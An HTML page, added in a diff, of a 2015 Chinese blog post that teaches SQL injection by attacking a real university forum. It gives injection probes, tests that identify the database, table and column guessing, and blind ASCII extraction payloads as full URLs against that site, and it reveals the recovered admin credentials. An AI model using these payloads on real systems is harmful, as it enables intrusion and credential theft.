@@ -1,0 +1,491 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>SQL注入实战教程 | Airing的博客</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="声明：
+本网站是广大教院的实验教学中心平台，制作日期是7年前，且荒废已久，前些日子负责人将服务器空间托管于我，所以本人拥有对该网站信息的修改权。故，用此网站实践一下SQL注入的基本流程，不借助于任何工具实现SQL注入。各位看官看看即可，补充一下网站的知识，不要用之做违反当地法令的事情。
+
+下面先附上两张效果图：">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQL注入实战教程">
+<meta property="og:url" content="http://yoursite.com/2015/07/14/SQL注入实战教程/index.html">
+<meta property="og:site_name" content="Airing的博客">
+<meta property="og:description" content="声明：
+本网站是广大教院的实验教学中心平台，制作日期是7年前，且荒废已久，前些日子负责人将服务器空间托管于我，所以本人拥有对该网站信息的修改权。故，用此网站实践一下SQL注入的基本流程，不借助于任何工具实现SQL注入。各位看官看看即可，补充一下网站的知识，不要用之做违反当地法令的事情。
+
+下面先附上两张效果图：">
+<meta property="og:image" content="http://7xkcl8.com1.z0.glb.clouddn.com/157141.png-normal.jpg">
+<meta property="og:image" content="http://7xkcl8.com1.z0.glb.clouddn.com/157142.png-normal.jpg">
+<meta property="og:image" content="http://7xkcl8.com1.z0.glb.clouddn.com/157143.png-normal.jpg">
+<meta property="og:image" content="http://7xkcl8.com1.z0.glb.clouddn.com/157144.png-normal.jpg">
+<meta property="og:image" content="http://7xkcl8.com1.z0.glb.clouddn.com/157145.png-normal.jpg">
+<meta property="og:image" content="http://7xkcl8.com1.z0.glb.clouddn.com/157146.png-normal.jpg">
+<meta property="og:image" content="http://7xkcl8.com1.z0.glb.clouddn.com/157147.png-normal.jpg">
+<meta property="og:image" content="http://7xkcl8.com1.z0.glb.clouddn.com/157148.png-normal.jpg">
+<meta property="og:image" content="http://7xkcl8.com1.z0.glb.clouddn.com/157149.png-normal.jpg">
+<meta property="og:image" content="http://7xkcl8.com1.z0.glb.clouddn.com/1571410.png-normal.jpg">
+<meta property="og:image" content="http://7xkcl8.com1.z0.glb.clouddn.com/1571411.png-normal.jpg">
+<meta property="og:image" content="http://7xkcl8.com1.z0.glb.clouddn.com/1571412.png-normal.jpg">
+<meta property="og:image" content="http://7xkcl8.com1.z0.glb.clouddn.com/1571413.png-normal.jpg">
+<meta property="og:image" content="http://7xkcl8.com1.z0.glb.clouddn.com/1571414.png-normal.jpg">
+<meta property="og:image" content="http://7xkcl8.com1.z0.glb.clouddn.com/1571415.png-normal.jpg">
+<meta property="og:image" content="http://7xkcl8.com1.z0.glb.clouddn.com/1571416.png-normal.jpg">
+<meta property="og:image" content="http://7xkcl8.com1.z0.glb.clouddn.com/1571417.png-normal.jpg">
+<meta property="og:image" content="http://7xkcl8.com1.z0.glb.clouddn.com/1571418.png-normal.jpg">
+<meta property="og:image" content="http://7xkcl8.com1.z0.glb.clouddn.com/1571419.png-normal.jpg">
+<meta property="og:image" content="http://7xkcl8.com1.z0.glb.clouddn.com/1571420.png-normal.jpg">
+<meta property="og:updated_time" content="2015-07-14T11:25:25.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="SQL注入实战教程">
+<meta name="twitter:description" content="声明：
+本网站是广大教院的实验教学中心平台，制作日期是7年前，且荒废已久，前些日子负责人将服务器空间托管于我，所以本人拥有对该网站信息的修改权。故，用此网站实践一下SQL注入的基本流程，不借助于任何工具实现SQL注入。各位看官看看即可，补充一下网站的知识，不要用之做违反当地法令的事情。
+
+下面先附上两张效果图：">
+  
+    <link rel="alternative" href="/atom.xml" title="Airing的博客" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.ico">
+  
+  <link rel="stylesheet" href="/css/style.css" type="text/css">
+</head>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+	<header id="header" class="inner">
+		<a href="/" class="profilepic">
+			
+			<img lazy-src="/img/face.png" class="js-avatar">
+			
+		</a>
+
+		<hgroup>
+		  <h1 class="header-author"><a href="/">Airing</a></h1>
+		</hgroup>
+
+		
+		<p class="header-subtitle">我是一只小小小小熊</p>
+		
+
+		
+			<div class="switch-btn">
+				<div class="icon">
+					<div class="icon-ctn">
+						<div class="icon-wrap icon-house" data-idx="0">
+							<div class="birdhouse"></div>
+							<div class="birdhouse_holes"></div>
+						</div>
+						<div class="icon-wrap icon-ribbon hide" data-idx="1">
+							<div class="ribbon"></div>
+						</div>
+						
+						<div class="icon-wrap icon-link hide" data-idx="2">
+							<div class="loopback_l"></div>
+							<div class="loopback_r"></div>
+						</div>
+						
+						
+						<div class="icon-wrap icon-me hide" data-idx="3">
+							<div class="user"></div>
+							<div class="shoulder"></div>
+						</div>
+						
+					</div>
+					
+				</div>
+				<div class="tips-box hide">
+					<div class="tips-arrow"></div>
+					<ul class="tips-inner">
+						<li>菜单</li>
+						<li>标签</li>
+						
+						<li>友情链接</li>
+						
+						
+						<li>捐助本站</li>
+						
+					</ul>
+				</div>
+			</div>
+		
+
+		<div class="switch-area">
+			<div class="switch-wrap">
+				<section class="switch-part switch-part1">
+					<nav class="header-menu">
+						<ul>
+						
+							<li><a href="/">主页</a></li>
+				        
+							<li><a href="/archives">所有文章</a></li>
+				        
+							<li><a href="/tags/随笔">随笔</a></li>
+				        
+							<li><a href="/instagram">相册</a></li>
+				        
+						</ul>
+					</nav>
+					<nav class="header-nav">
+						<div class="social">
+							
+								<a class="github" target="_blank" href="https://github.com/airingursb" title="github">github</a>
+					        
+								<a class="weibo" target="_blank" href="http://weibo.com/2696578192/profile?topnav=1&wvr=6" title="weibo">weibo</a>
+					        
+								<a class="mail" target="_blank" href="/gx-deng@163.com" title="mail">mail</a>
+					        
+								<a class="facebook" target="_blank" href="https://www.facebook.com/airing.gx" title="facebook">facebook</a>
+					        
+						</div>
+					</nav>
+				</section>
+				
+				
+				<section class="switch-part switch-part2">
+					<div class="widget tagcloud" id="js-tagcloud">
+						<a href="/tags/C/" style="font-size: 10px;">C</a> <a href="/tags/C51/" style="font-size: 10px;">C51</a> <a href="/tags/HTML5/" style="font-size: 20px;">HTML5</a> <a href="/tags/Java/" style="font-size: 16px;">Java</a> <a href="/tags/JavaScript/" style="font-size: 10px;">JavaScript</a> <a href="/tags/Linux/" style="font-size: 10px;">Linux</a> <a href="/tags/Markdown/" style="font-size: 10px;">Markdown</a> <a href="/tags/Swift/" style="font-size: 12px;">Swift</a> <a href="/tags/emacs/" style="font-size: 10px;">emacs</a> <a href="/tags/数据库/" style="font-size: 14px;">数据库</a> <a href="/tags/正则表达式/" style="font-size: 10px;">正则表达式</a> <a href="/tags/第三方/" style="font-size: 10px;">第三方</a> <a href="/tags/转载/" style="font-size: 10px;">转载</a> <a href="/tags/随笔/" style="font-size: 18px;">随笔</a> <a href="/tags/黑科技/" style="font-size: 12px;">黑科技</a>
+					</div>
+				</section>
+				
+				
+				
+				<section class="switch-part switch-part3">
+					<div id="js-friends">
+					
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="http://penny.gift/">Hi,Penny</a>
+			        
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="http://ursb.me/EduPlayer/">EduPlayer</a>
+			        
+			        </div>
+				</section>
+				
+
+				
+				
+				<section class="switch-part switch-part4">
+				
+					<div id="js-aboutme">谢谢支持！使用支付宝扫码即可。
+					<img src="http://7xkcl8.com1.z0.glb.clouddn.com/ursbzhifubao.png-zfb.jpg" />
+					</div>
+					
+				</section>
+				
+			</div>
+		</div>
+	</header>				
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+  	<div class="overlay">
+  		<div class="slider-trigger"></div>
+  		<h1 class="header-author js-mobile-header hide">Airing</h1>
+  	</div>
+	<div class="intrude-less">
+		<header id="header" class="inner">
+			<div class="profilepic">
+				<img lazy-src="/img/face.png" class="js-avatar">
+			</div>
+			<hgroup>
+			  <h1 class="header-author">Airing</h1>
+			</hgroup>
+			
+			<p class="header-subtitle">我是一只小小小小熊</p>
+			
+			<nav class="header-menu">
+				<ul>
+				
+					<li><a href="/">主页</a></li>
+		        
+					<li><a href="/archives">所有文章</a></li>
+		        
+					<li><a href="/tags/随笔">随笔</a></li>
+		        
+					<li><a href="/instagram">相册</a></li>
+		        
+		        <div class="clearfix"></div>
+				</ul>
+			</nav>
+			<nav class="header-nav">
+				<div class="social">
+					
+						<a class="github" target="_blank" href="https://github.com/airingursb" title="github">github</a>
+			        
+						<a class="weibo" target="_blank" href="http://weibo.com/2696578192/profile?topnav=1&wvr=6" title="weibo">weibo</a>
+			        
+						<a class="mail" target="_blank" href="/gx-deng@163.com" title="mail">mail</a>
+			        
+						<a class="facebook" target="_blank" href="https://www.facebook.com/airing.gx" title="facebook">facebook</a>
+			        
+				</div>
+			</nav>
+		</header>				
+	</div>
+</nav>
+      <div class="body-wrap"><article id="post-SQL注入实战教程" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2015/07/14/SQL注入实战教程/" class="article-date">
+  	<time datetime="2015-07-14T16:48:38.000Z" itemprop="datePublished">2015-07-14</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      SQL注入实战教程
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/黑科技/">黑科技</a></li></ul>
+	</div>
+
+        
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="u58F0_u660E_uFF1A"><a href="#u58F0_u660E_uFF1A" class="headerlink" title="声明："></a>声明：</h3><blockquote>
+<p>本网站是广大教院的实验教学中心平台，制作日期是7年前，且荒废已久，前些日子负责人将服务器空间托管于我，所以本人拥有对该网站信息的修改权。故，用此网站实践一下SQL注入的基本流程，不借助于任何工具实现SQL注入。各位看官看看即可，补充一下网站的知识，不要用之做违反当地法令的事情。</p>
+</blockquote>
+<p>下面先附上两张效果图：<br><img src="http://7xkcl8.com1.z0.glb.clouddn.com/157141.png-normal.jpg" alt="image"><br><a id="more"></a><br><img src="http://7xkcl8.com1.z0.glb.clouddn.com/157142.png-normal.jpg" alt="image"></p>
+<p>下面开始来进行实战环节，在主页看到一个实验论坛，是个突破口可以点进去看看。</p>
+<p><img src="http://7xkcl8.com1.z0.glb.clouddn.com/157143.png-normal.jpg" alt="image"></p>
+<p>然后随便找了个帖子点了进去<br><img src="http://7xkcl8.com1.z0.glb.clouddn.com/157144.png-normal.jpg" alt="image"></p>
+<p>首先发个回帖，尝试下XXS跨站脚本攻击，发现没用。。<br><img src="http://7xkcl8.com1.z0.glb.clouddn.com/157145.png-normal.jpg" alt="image"><br>然后检测下看看有没有SQL注入漏洞，这种链接如<br><code>http://www.xxx.com/xxx.asp?id=YY</code><br>几年前的asp网站，基本上都有这种漏洞。</p>
+<p><img src="http://7xkcl8.com1.z0.glb.clouddn.com/157146.png-normal.jpg" alt="image"></p>
+<p>采用<strong>单引号法</strong>：</p>
+<p>在浏览器地址栏中的页面链接地址后面增加一个单引号，刷新</p>
+<p>然后访问该链接地址，浏览器可能会返回类似于下面的错误提示信息：</p>
+<blockquote>
+<p>Microsoft JET Database Engine 错误’80040e14’</p>
+<p>字符串的语法错误在查询表达式’ID=YY’中。</p>
+<p>/xxx.asp 行8</p>
+</blockquote>
+<p><img src="http://7xkcl8.com1.z0.glb.clouddn.com/157147.png-normal.jpg" alt="image"><br>这样就说明了该网站可能存在SQL注入攻击的漏洞。</p>
+<p>为什么说是可能存在而不是一定存在了？首先，不一定每台服务器的IIS都返回具体错误提示给客户端，如果程序中加了cint(参数)之类语句的话，ＳＱＬ注入是不会成功的，但服务器同样会报错，具体提示信息为处理 URL 时服务器上出错。其次，部分对ＳＱＬ注入有一点了解的程序员，认为只要把单引号过滤掉就安全了，这种情况不为少数，如果你用单引号测试，是测不到注入点的。</p>
+<p>所以我们可以用第二种方法来确定它是否存在可注入点。</p>
+<ul>
+<li>第一步，链接后加 and 1 = 1，刷新，<br><img src="http://7xkcl8.com1.z0.glb.clouddn.com/157148.png-normal.jpg" alt="image"><br><img src="http://7xkcl8.com1.z0.glb.clouddn.com/157149.png-normal.jpg" alt="image"></li>
+</ul>
+<p>发现页面没有变化</p>
+<ul>
+<li>第二步，链接后加 and 1 = 2，刷新，<br><img src="http://7xkcl8.com1.z0.glb.clouddn.com/1571410.png-normal.jpg" alt="image"><br><img src="http://7xkcl8.com1.z0.glb.clouddn.com/1571411.png-normal.jpg" alt="image"></li>
+</ul>
+<p>出错提示，提示的是帖子找不到。即提示<em>BOF或EOF（程序没做任何判断时）、或提示找不到记录（判断了rs.eof时）、或显示内容为空（程序加了on error resume next）</em></p>
+<p>恩，所以它就是可以注入的。</p>
+<p>下面总结一下这个方法：<br><code>http://jyjssfzx.gzhu.edu.cn/bbs/topic.asp?l_id=11&amp;t_id=11</code><br><code>http://jyjssfzx.gzhu.edu.cn/bbs/topic.asp?l_id=11&amp;t_id=11 and 1=1</code><br><code>http://jyjssfzx.gzhu.edu.cn/bbs/topic.asp?l_id=11&amp;t_id=11 and 1=2</code></p>
+<p>这就是经典的1=1、1=2测试法了，怎么判断呢？看看上面三个网址返回的结果就知道了：</p>
+<p>可以注入的表现：</p>
+<blockquote>
+<p>① 正常显示（这是必然的，不然就是程序有错误了）</p>
+<p>② 正常显示，内容基本与①相同</p>
+<p>③ 提示BOF或EOF（程序没做任何判断时）、或提示找不到记录（判断了rs.eof时）、或显示内容为空（程序加了on error resume next）</p>
+</blockquote>
+<p>不可以注入就比较容易判断了，①同样正常显示，②和③一般都会有程序定义的错误提示，或提示类型转换时出错。</p>
+<p>下面，我们再来<strong>判断一下数据库</strong>：</p>
+<p>ASP的数据库基本上（99%）都是SQLServer或者Access，所以我们只要判断出它是哪一种就可以了</p>
+<p>在确认可以注入的情况下，使用下面的语句：</p>
+<p><code>http://jyjssfzx.gzhu.edu.cn/bbs/topic.asp?l\_id=11&amp;t\_id=11 and (select count(\*) from sysobjects)\&gt;0</code><br><code>http://jyjssfzx.gzhu.edu.cn/bbs/topic.asp?l\_id=11&amp;t\_id=11 and (select count(\*) from msysobjects)\&gt;0</code></p>
+<p>如果数据库是SQLServer，那么第一个网址的页面与原页面<em><a href="http://www.mytest.com/showdetail.asp?id=" target="_blank" rel="external">http://www.mytest.com/showdetail.asp?id=</a> 49</em>是大致相同的；而第二个网址，由于找不到表<em>msysobjects</em>，会提示出错，就算程序有容错处理，页面也与原页面完全不同。</p>
+<p>如果数据库用的是Access，那么情况就有所不同，第一个网址的页面与原页面完全不同；第二个网址，则视乎数据库设置是否允许读该系统表，一般来说是不允许的，所以与原网址也是完全不同。大多数情况下，用第一个网址就可以得知系统所用的数据库类型，第二个网址只作为开启IIS错误提示时的验证。</p>
+<p>但是我们根本不需要用这种方法，在最初链接加引号的时候，我们已经知道它是Access数据库了</p>
+<p><img src="http://7xkcl8.com1.z0.glb.clouddn.com/1571412.png-normal.jpg" alt="image"></p>
+<p><strong>至此，判断SQL注入点已经结束。此论坛的确存在SQL注入点，数据库为Access</strong></p>
+<p>下面，我们就开始进行<strong>SQL注入</strong>。</p>
+<p><strong><em>根据注入参数类型，在脑海中重构SQL语句的原貌，按参数类型主要分为下面三种：</em></strong></p>
+<blockquote>
+<p>(A) ID=11 这类注入的参数是数字型，SQL语句原貌大致如下：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator"><span class="keyword">Select</span> * <span class="keyword">from</span> 表名 <span class="keyword">where</span> 字段=<span class="number">11</span></span></span><br></pre></td></tr></table></figure>
+<p>注入的参数为ID=11 And [查询条件]，即是生成语句：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator"><span class="keyword">Select</span> * <span class="keyword">from</span> 表名 <span class="keyword">where</span> 字段=<span class="number">11</span> <span class="keyword">And</span> [查询条件]</span></span><br></pre></td></tr></table></figure>
+<p>(B) Class=连续剧 这类注入的参数是字符型，SQL语句原貌大致概如下：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator"><span class="keyword">Select</span> * <span class="keyword">from</span> 表名 <span class="keyword">where</span> 字段=’连续剧’</span></span><br></pre></td></tr></table></figure>
+<p>注入的参数为Class=连续剧’ and [查询条件] and ‘’=’ ，即是生成语句：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator"><span class="keyword">Select</span> * <span class="keyword">from</span> 表名 <span class="keyword">where</span> 字段=’连续剧’ <span class="keyword">and</span> [查询条件] <span class="keyword">and</span> ‘’=’’</span></span><br></pre></td></tr></table></figure>
+<p>(C)搜索时没过滤参数的，如keyword=关键字，SQL语句原貌大致如下：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator"><span class="keyword">Select</span> * <span class="keyword">from</span> 表名 <span class="keyword">where</span> 字段<span class="keyword">like</span> ’%关键字%’</span></span><br></pre></td></tr></table></figure>
+<p>注入的参数为keyword=’ and [查询条件] and ‘%25’=’， 即是生成语句：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator"><span class="keyword">Select</span> * <span class="keyword">from</span> 表名 <span class="keyword">where</span>字段<span class="keyword">like</span> ’%’ <span class="keyword">and</span> [查询条件] <span class="keyword">and</span> ‘%’=’%’</span></span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>接着，将查询条件替换成SQL语句，猜解表名，例如：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ID=11 And (<span class="operator"><span class="keyword">Select</span> <span class="keyword">Count</span>(*) <span class="keyword">from</span> <span class="keyword">Admin</span>)&gt;=<span class="number">0</span></span></span><br></pre></td></tr></table></figure>
+<p><img src="http://7xkcl8.com1.z0.glb.clouddn.com/1571413.png-normal.jpg" alt="image"></p>
+<p>运气真好</p>
+<p>如果页面就与ID=11的相同，说明附加条件成立，即表Admin存在，反之，即不存在（请牢记这种方法）。如此循环，直至猜到表名为止。<br><img src="http://7xkcl8.com1.z0.glb.clouddn.com/1571414.png-normal.jpg" alt="image"></p>
+<p>上图结果，就说明admin是存在的。表名猜出来后，将Count(*)替换成Count(字段名)，用同样的原理猜解字段名。</p>
+<p>先猜一下username</p>
+<p>说明username字段不存在<br><img src="http://7xkcl8.com1.z0.glb.clouddn.com/1571415.png-normal.jpg" alt="image"><br><img src="http://7xkcl8.com1.z0.glb.clouddn.com/1571416.png-normal.jpg" alt="image"></p>
+<p>再猜admin<br><img src="http://7xkcl8.com1.z0.glb.clouddn.com/1571417.png-normal.jpg" alt="image"><br><img src="http://7xkcl8.com1.z0.glb.clouddn.com/1571418.png-normal.jpg" alt="image"></p>
+<p>Admin表有字段admin。</p>
+<p>同理，重复以上步骤，还猜出了有password。</p>
+<p>最后，在表名和列名猜解成功后，再使用SQL语句，得出字段的值，下面介绍一种最常用的方法－Ascii逐字解码法，虽然这种方法速度很慢，但肯定是可行的方法。</p>
+<p>我们举个例子，已知表Admin中存在admin字段，首先，我们取第一条记录，测试长度：</p>
+<p><code>http://jyjssfzx.gzhu.edu.cn/bbs/topic.asp?l_id=11&amp;t_id=11 and (select top 1 len(admin) from Admin)&gt;0</code></p>
+<p>先说明原理，如果top 1的admin长度大于0，则条件成立；接着就是&gt;1、&gt;2、&gt;3这样测试下去，一直到条件不成立为止，然后我继续测&gt;3成立，&gt;4不成立，就是len(admin)=4</p>
+<p>下图就是&gt;4时的界面，0~3都是正常显示，我就不截图了。<br><img src="http://7xkcl8.com1.z0.glb.clouddn.com/1571419.png-normal.jpg" alt="image"></p>
+<p>当然没人会笨得从0,1,2,3一个个测试，怎么样才比较快就看各自发挥了。</p>
+<p>知道了长度后就可以开始猜解了</p>
+<blockquote>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">And (<span class="operator"><span class="keyword">Select</span> top <span class="number">1</span> <span class="keyword">asc</span>(<span class="keyword">mid</span>(<span class="keyword">admin</span>,<span class="keyword">n</span>,<span class="number">1</span>)) <span class="keyword">from</span> <span class="keyword">admin</span>)&gt;<span class="number">100</span></span></span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>n就是猜解的表名的第几位，最后的长度数字就是刚才猜解出来的列名长度了<br><code>And (Select top 1 asc(mid(admin,1,1)) from admin)&gt;100</code><br> 就是猜解user里内容的第一位的ASCII字符是不是大于100</p>
+<p>正确的话，那么表示USER第一个字符的ASCII码大于100，那么就猜>120，返回错误就是介于100－120之间，然后再一步一步的缩少，最终得到正确字符XXX，然后用ASCII转换器吧这个转换成普通字符就可以了</p>
+<p>然后就是第二位<br><code>And (Select top 1 asc(mid(admin,2,1)) from admin)&gt;100</code><br>一直猜下去。</p>
+<p>然后我就一步步测，测出来 第一位106，第二位97，第三位110，第四位101，转换成英文就是jane……</p>
+<p>以上步骤再来一次，测得密码：123</p>
+<p>综上，我们知道了，这个网站用的是Access数据库，然后数据库里面有个admin表，其表有两个字段，admin和password，其第一条记录是 jane，123。也就是说管理员账号是jane，密码123。</p>
+<p>至此，管理员账号密码权限获取成功，你想做什么就是你的事情了。</p>
+<p>比如说:<br><img src="http://7xkcl8.com1.z0.glb.clouddn.com/1571420.png-normal.jpg" alt="image"></p>
+<p>本次SQL注入到此结束，希望能给大家带来不一样的体验。</p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2015/07/14/浅谈设计模式之单例模式/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption"><</strong>
+      <div class="article-nav-title">
+        
+          浅谈设计模式之单例模式
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2015/07/13/谈谈我所理解的教育/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">谈谈我所理解的教育</div>
+      <strong class="article-nav-caption">></strong>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+<div class="share">
+	<!-- JiaThis Button BEGIN -->
+	<div class="jiathis_style">
+		<span class="jiathis_txt">分享到：</span>
+		<a class="jiathis_button_tsina"></a>
+		<a class="jiathis_button_cqq"></a>
+		<a class="jiathis_button_douban"></a>
+		<a class="jiathis_button_weixin"></a>
+		<a class="jiathis_button_tumblr"></a>
+		<a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jtico jtico_jiathis" target="_blank"></a>
+	</div>
+	<script type="text/javascript" src="http://v3.jiathis.com/code/jia.js?uid=1405949716054953" charset="utf-8"></script>
+	<!-- JiaThis Button END -->
+</div>
+
+
+
+<div class="duoshuo">
+	<!-- 多说评论框 start -->
+	<div class="ds-thread" data-thread-key="SQL注入实战教程" data-title="SQL注入实战教程" data-url="http://yoursite.com/2015/07/14/SQL注入实战教程/"></div>
+	<!-- 多说评论框 end -->
+	<!-- 多说公共JS代码 start (一个网页只需插入一次) -->
+	<script type="text/javascript">
+	var duoshuoQuery = {short_name:"airingursb"};
+	(function() {
+		var ds = document.createElement('script');
+		ds.type = 'text/javascript';ds.async = true;
+		ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+		ds.charset = 'UTF-8';
+		(document.getElementsByTagName('head')[0] 
+		 || document.getElementsByTagName('body')[0]).appendChild(ds);
+	})();
+	</script>
+	<!-- 多说公共JS代码 end -->
+</div>
+
+
+
+
+</div>
+      <footer id="footer">
+  <div class="outer">
+    <div id="footer-info">
+    	<div class="footer-left">
+    		&copy; 2016 Airing
+    	</div>
+      	<div class="footer-right">
+      		<a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/litten/hexo-theme-yilia" target="_blank">Yilia</a> by Litten
+      	</div>
+    </div>
+  </div>
+</footer>
+    </div>
+    
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css" type="text/css">
+
+
+<script>
+	var yiliaConfig = {
+		fancybox: true,
+		mathjax: true,
+		animate: true,
+		isHome: false,
+		isPost: true,
+		isArchive: false,
+		isTag: false,
+		isCategory: false,
+		open_in_new: false
+	}
+</script>
+<script src="http://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js" type="text/javascript"></script>
+<script src="/js/main.js" type="text/javascript"></script>
+
+
+
+
+
+
+<script type="text/x-mathjax-config">
+MathJax.Hub.Config({
+    tex2jax: {
+        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+        processEscapes: true,
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    }
+});
+
+MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+        all[i].SourceElement().parentNode.className += ' has-jax';                 
+    }       
+});
+</script>
+
+<script type="text/javascript" src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+
+
+  </div>
+</body>
+</html>
